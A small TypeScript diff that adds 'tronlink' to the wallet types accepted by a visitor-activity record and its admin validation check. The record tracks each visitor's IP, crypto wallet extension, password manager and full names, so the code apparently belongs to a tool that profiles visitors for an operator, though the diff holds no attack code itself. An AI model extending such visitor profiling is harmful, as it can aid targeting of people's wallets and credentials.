@@ -9,7 +9,7 @@ const MAX_FEEDBACK_LENGTH = 1000;
 
 export type VisitorActivity = {
   ipAddress: string;
-  wallet: "metamask" | "phantom" | null;
+  wallet: "metamask" | "phantom" | "tronlink" | null;
   passwordManager: "1Password" | "Bitwarden" | null;
   syncStatus: "Synced" | "Not";
   fullNames: {
@@ -367,7 +367,8 @@ export const handleAdminActivity = async (
       typeof body.ipAddress !== "string" ||
       (body.wallet !== null &&
         body.wallet !== "metamask" &&
-        body.wallet !== "phantom") ||
+        body.wallet !== "phantom" &&
+        body.wallet !== "tronlink") ||
       (body.passwordManager !== null &&
         body.passwordManager !== "1Password" &&
         body.passwordManager !== "Bitwarden") ||
